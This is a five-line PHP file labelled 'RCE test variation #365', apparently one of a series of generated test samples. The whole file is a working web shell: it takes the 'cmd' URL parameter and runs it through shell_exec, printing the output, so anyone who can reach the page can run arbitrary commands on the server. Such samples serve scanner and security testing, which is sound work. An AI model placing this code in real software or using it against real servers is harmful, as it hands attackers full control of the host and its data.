<?php
// RCE test variation #365
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>